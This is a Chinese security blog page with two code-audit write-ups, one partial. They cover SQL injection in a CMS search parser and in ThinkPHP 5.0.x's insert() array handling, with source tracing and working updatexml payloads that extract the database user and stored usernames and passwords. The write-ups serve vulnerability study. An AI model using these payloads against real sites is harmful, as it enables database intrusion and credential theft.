</code></pre><p>这里代码逻辑:将<code>GET</code>传输过来的字段直接赋值给<code>where2</code>数组 接着进入<code>getList()</code>方法 造成注入</p>
<p>B.然后同上,搜索<code>home\controller</code>中调用<code>parserSearchLabel()</code>的方法,我们追溯调用该<code>parserSearchLabel()</code>函数的方法:<br> <code>parserSearchLabel()---&gt;index(SearchController.php)</code> 查看该index函数:</p>
<pre><code>public function index()
{
    $content = parent::parser(&apos;search.html&apos;); // 框架标签解析
    ...
    $content = $this-&gt;parser-&gt;parserSearchLabel($content); // 搜索结果标签    跟进这个地方
    ...
}
</code></pre><p>这里逻辑就很清楚了,利用系统解析<code>search</code>标签字段而对<code>get</code>传输进来的参数无有效过滤造成注入。</p>
<p>C.涉及文件:</p>
<pre><code>SearchController.php的index()---&gt;parserSearchLabel()--&gt;getList()/getSpecifyList()---&gt;where() 
</code></pre><p><strong>漏洞利用:</strong></p>
<pre><code>payload: http://127.0.0.1:89/index.php/search?updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x23,password)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
</code></pre><p>注入:<br><img src="http://static.zybuluo.com/chhyx/lx86w77bhpkxenv0vipg9ry8/image_1cpqthi64jkb1iae1q8u1n5i1oc1l.png" alt="image_1cpqthi64jkb1iae1q8u1n5i1oc1l.png-144.6kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/15/ThinkPHP框架 5.0.x sql注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/15/ThinkPHP框架 5.0.x sql注入/" itemprop="url">代码审计 | ThinkPHP框架 5.0.x sql注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-15T08:15:41+08:00">
                2018-09-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>笔者也是第一次审计Thinkphp框架,在结合网上视频跟Thinkphp5.0手册,完成了这次sql注入漏洞的审计,学习记录一波。</p>
</blockquote>
<hr>
<p>##<strong>1.thinkphp基础知识:</strong></p>
<p>thinkphp初始目录结构:</p>
<blockquote>
<pre><code>project  应用部署目录
├─application           应用目录（可设置）
│  ├─common             公共模块目录（可更改）
│  ├─index              模块目录(可更改)
│  │  ├─config.php      模块配置文件
│  │  ├─common.php      模块函数文件
│  │  ├─controller      控制器目录
│  │  ├─model           模型目录
│  │  ├─view            视图目录
│  │  └─ ...            更多类库目录
│  ├─command.php        命令行工具配置文件
│  ├─common.php         应用公共（函数）文件
│  ├─config.php         应用（公共）配置文件
│  ├─database.php       数据库配置文件
│  ├─tags.php           应用行为扩展定义文件
│  └─route.php          路由配置文件
├─extend                扩展类库目录（可定义）
├─public                WEB 部署目录（对外访问目录）
│  ├─static             静态资源存放目录(css,js,image)
│  ├─index.php          应用入口文件
│  ├─router.php         快速测试文件
│  └─.htaccess          用于 apache 的重写
├─runtime               应用的运行时目录（可写，可设置）
├─vendor                第三方类库目录（Composer）
├─thinkphp              框架系统目录
│  ├─lang               语言包目录
│  ├─library            框架核心类库目录
│  │  ├─think           Think 类库包目录
│  │  └─traits          系统 Traits 目录
│  ├─tpl                系统模板目录
│  ├─.htaccess          用于 apache 的重写
│  ├─.travis.yml        CI 定义文件
│  ├─base.php           基础定义文件
│  ├─composer.json      composer 定义文件
│  ├─console.php        控制台入口文件
│  ├─convention.php     惯例配置文件
│  ├─helper.php         助手函数文件（可选）
│  ├─LICENSE.txt        授权说明文件
│  ├─phpunit.xml        单元测试配置文件
│  ├─README.md          README 文件
│  └─start.php          框架引导文件
├─build.php             自动生成定义文件（参考）
├─composer.json         composer 定义文件
├─LICENSE.txt           授权说明文件
├─README.md             README 文件
├─think                 命令行入口文件
</code></pre></blockquote>
<p>url访问:</p>
<pre><code>127.0.0.1:83  /index.php   /Index       /index         /index
域名          入口文件      前台      前台控制器    index方法
</code></pre><p>助手函数<a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">input()</a>,专用来接收get，post等的值:<br><img src="http://static.zybuluo.com/chhyx/3sb6ttvy8bj5pf1o3wqj1am2/image_1cne0gl8i1jo21s7mj8l7qg1c0220.png" alt="image_1cne0gl8i1jo21s7mj8l7qg1c0220.png-59.1kB"></p>
<p>##<strong>2.环境搭建:</strong><br>A.新建数据库tp,在数据库tp中新建user表,三个字段 分别为Id、name、pwd</p>
<p><img src="http://static.zybuluo.com/chhyx/z5zg1yp93oq55yqa8s45vll1/image_1cne5r0511pvo1goqtra1ht6154s4a.png" alt="image_1cne5r0511pvo1goqtra1ht6154s4a.png-18.4kB"></p>
<p>B.连接数据库并开启调试模式</p>
<p><img src="http://static.zybuluo.com/chhyx/8n9knmbckzp29o159el9ez2a/image_1cne60jmug89t3puif13jb15cv4n.png" alt="image_1cne60jmug89t3puif13jb15cv4n.png-63.5kB"></p>
<p>C.简单写一个insert功能,在<code>\application\index\controller\index.php</code><br>写入如下代码:</p>
<pre><code>&lt;?php
namespace app\index\controller;
use think\Db;
class Index
{
    public function user()
    {
        return &apos;aa&apos;;
    }
    public  function testsql()
    {
        $name = input(&apos;get.name/a&apos;);
        db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 1])-&gt;insert([&apos;name&apos;=&gt;$name]);
    }
}
</code></pre><p>##<strong>2.漏洞利用:</strong><br>payload:</p>
<pre><code>http://127.0.0.1:82/index.php/index/index/testsql?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1
</code></pre><p><img src="http://static.zybuluo.com/chhyx/s4z4s0daqfnvxf1m3mhysq4p/image_1cne0ak8fq3n1dapnnq18ttqe51j.png" alt="image_1cne0ak8fq3n1dapnnq18ttqe51j.png-71.4kB"></p>
<p>##<strong>3.代码分析:</strong><br>跟进<code>insert()</code>方法：</p>
<pre><code>#thinkphp\library\think\db\Query.php 2079行:
    ......
public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
    {
        // 分析查询表达式
        $options = $this-&gt;parseExpress();
        $data    = array_merge($options[&apos;data&apos;], $data);
</code></pre><p>接着:</p>
<pre><code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);
</code></pre><p>进入bulider.php的insert()方法:</p>
<pre><code>#thinkphp\library\think\db\Builder.php  719行:
public function insert(array $data, $options = [], $replace = false)
{
    // 分析并处理数据
$data = $this-&gt;parseData($data, $options);
</code></pre><p>进入parseDate()方法,相关变量的值已经写入注释:</p>
<pre><code>#thinkphp\library\think\db\Builder.php  86行:
protected function parseData($data, $options)
        {
            ...

            foreach ($data as $key =&gt; $val) {
            //$key:name
            //$val:{&apos;inc&apos;,&apos;updatexml(1,concat(0x7,user(),0x7e),1)&apos;,&apos;1&apos;} 
               ...
                if (false === strpos($key, &apos;.&apos;) &amp;&amp; !in_array($key, $fields, true)) {
                        ...
                } elseif (is_null($val)) {
                   ...
                } elseif (is_array($val) &amp;&amp; !empty($val)) {
                    switch ($val[0]) {  #$val[1]:updatexml(1,concat(0x7,user(),0x7e),1)  val[2]:1
                        case &apos;exp&apos;:
                            $result[$item] = $val[1];
                            break;
                        case &apos;inc&apos;:
                            $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);
                            break;
                        case &apos;dec&apos;:
                            $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]);
                            break;
                    }
                } 
            ...
            return $result;  #`name`:updatexml(1,concat(0x7,user(),0x7e),1)+1
        }
</code></pre><p>我们可看出<code>$val</code>是一个数组,且<code>$val[0]==&#39;inc&#39;</code>,进入对应的switch语句:</p>
<pre><code>case &apos;inc&apos;:
    $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);
    break;
</code></pre><p>对<code>$val[1]</code>也就是<code>updatexml(1,concat(0x7,user(),0x7e),1)</code>进行<code>parsekey()</code>方法的处理,但是并没有什么过滤,原样输出:</p>
<pre><code>    protected function parseKey($key, $options = [])
{
    return $key;//$key：updatexml(1,concat(0x7,user(),0x7e),1)
}
</code></pre><p>而<code>floatval($val[2])</code>的结果为1<br>所以我们最后返回到<code>Query.php</code>的<code>insert()</code>方法执行的sql语句是:</p>
<p><img src="http://static.zybuluo.com/chhyx/okk46bobgycn159pb8a1pbdn/image_1cne41cqcfq1djq1lei18d65173t.png" alt="image_1cne41cqcfq1djq1lei18d65173t.png-114.8kB"></p>
<p>SQL注入成功。</p>
<p>另一处的update()造成的注入与这个类似,这里就不再赘述了。小伙伴们如果想复现的话,只需改index.php文件insert为update即可。</p>
<hr>
<p>1.搭建thinkphp遇到个坑:<br>在保存index.php后 url查看，发现提示命名空间必须在首行:<br><img src="http://static.zybuluo.com/chhyx/wroy49bujchf58dmq6s8f477/image_1cndv2tcvafm1erc6vj19vp148r16.png" alt="image_1cndv2tcvafm1erc6vj19vp148r16.png-37.3kB"></p>
<p>填坑:<br>用记事本打开相关文件,在保存时选择ANSI编码即可解决<br><img src="http://static.zybuluo.com/chhyx/c21h6hvf69psufq1uk5jeat0/image_1cndv1f2v1ol81a3km1j1i21l4vp.png" alt="image_1cndv1f2v1ol81a3km1j1i21l4vp.png-56.6kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">27</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
